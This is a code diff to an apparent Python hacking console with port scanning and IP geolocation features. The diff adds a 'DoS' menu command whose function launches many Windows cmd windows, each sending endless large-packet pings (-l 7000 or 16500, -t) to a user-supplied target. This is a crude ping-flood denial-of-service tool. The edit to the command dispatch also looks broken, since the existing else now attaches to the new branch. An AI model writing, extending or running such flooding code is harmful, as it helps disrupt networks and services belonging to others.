@@ -6,8 +6,11 @@ import socket
 import datetime
 import threading
 import requests
+import subprocess
 import click
 import traceback
+
+separator = "-------------------------"
 
 scan_results = {
     "getip": [],
@@ -20,28 +23,6 @@ def clear_screen():
         os.system("cls")
     else:
         os.system("clear")
-
-rand2=['0.1','0.3','0.6','0.2']
-for loading in range(0):
-    j = float(random.choice(rand2))
-    click.echo('\r', nl=False)
-    a = float(random.choice(rand2))
-    if loading > 10:
-        a = 0
-    if loading > 29:
-        a = j
-    if loading > 33:
-        a = 0
-    if loading > 60:
-        a = j
-    if loading > 68:
-        a = 0
-    time.sleep(a)
-    click.echo('loading SppR console [%-10s] %d%%' % ('=' * loading, loading), nl=False)
-    click.echo('', nl=True)
-    time.sleep(0.08)
-
-report_counter = 1
 
 def logo():
     clear_screen()
@@ -83,6 +64,34 @@ def port_scan_worker(target_ip, start_time):
         print("Ошибка: Не удалось определить IP-адрес цели. Пожалуйста, проверьте правильность IP.")
     except Exception as e:
         print("Произошла ошибка:", str(e))
+
+def DoS():
+    num_consoles = int(input("enter cmd`s count:"))
+    target_url = input("enter target url:")
+    print(separator)
+    while True:
+        print("1: 7000KB")
+        print("2: 16500KB")
+        request_data_size_choose = int(input("choose 1 or 2:"))
+
+        if request_data_size_choose == 1:
+            request_data_size = "7000"
+            break
+        elif request_data_size_choose == 2:
+            request_data_size = "16500"
+            break
+        else:
+            print("\033[1;31minvalid value!\033[0m")
+
+    count = 0
+    while count < num_consoles:
+        console_name = f"ping_console_{count}"
+        command = f'start "ping_console_{count}" cmd /k ping {target_url} -l {request_data_size} -t'
+            
+        subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            
+        count += 1
+        time.sleep(0.1)
 
 def mainfunc():
     alph = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
@@ -180,7 +189,7 @@ def mainfunc():
                 region = data["region"]
                 country = data["country"]
 
-                result = f"City: {city}, \nRegion: {region}, \nCountry: {country}"
+                result = (f"City: {city}, \nRegion: {region}, \nCountry: {country}")
             else:
                 result = "Location data not available."
 
@@ -189,6 +198,8 @@ def mainfunc():
 
         print(result)
 
+    if main == "DoS":
+        DoS()
 
     else:
         print("\033[1;31mInvalid command. Type 'help' for a list of commands.\033[0m")
